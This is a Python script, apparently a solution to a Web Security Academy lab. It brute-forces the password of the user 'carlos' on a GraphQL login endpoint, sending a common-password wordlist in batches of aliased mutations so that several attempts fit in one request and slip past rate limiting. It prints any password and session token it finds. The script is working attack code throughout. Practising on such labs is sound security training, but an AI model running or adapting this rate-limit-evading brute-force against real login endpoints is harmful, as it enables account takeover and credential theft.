import requests
import time

URL = "https://0a7000890321cde383ff29fe000800ec.web-security-academy.net/graphql/v1"

WORDLIST = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111",
    "1234567","dragon","123123","baseball","abc123","football","monkey","letmein",
    "shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael",
    "654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe",
    "killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster",
    "soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000",
    "charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster",
    "112233","george","computer","michelle","jessica","pepper","1111","zxcvbn",
    "555555","11111111","131313","freedom","777777","pass","maggie","159753",
    "aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love",
    "ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321",
    "dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor",
    "monitoring","montana","moon","moscow"
]

HEADERS = {
    "Content-Type": "application/json"
}

def build_mutation(passwords):
    mutation = "mutation login {\n"
    for i, pwd in enumerate(passwords):
        mutation += f'''
  a{i}: login(input: {{ username: "carlos", password: "{pwd}" }}) {{
    success
    token
  }}
'''
    mutation += "\n}"
    return mutation

for i in range(0, len(WORDLIST), 3):
    batch = WORDLIST[i:i+3]
    print(f"[+] Testando senhas: {batch}")

    payload = {
        "query": build_mutation(batch)
    }

    response = requests.post(URL, json=payload, headers=HEADERS)
    data = response.json()

    for key, result in data.get("data", {}).items():
        if result.get("success") is True:
            print("\n[🔥] SENHA ENCONTRADA!")
            print(f"Senha: {batch[int(key[1:])]}")
            print(f"Token: {result.get('token')}")
            exit(0)

    print("[⏳] Rate limit atingido. Aguardando 60 segundos...\n")
    time.sleep(60)

print("[-] Senha não encontrada na wordlist.")
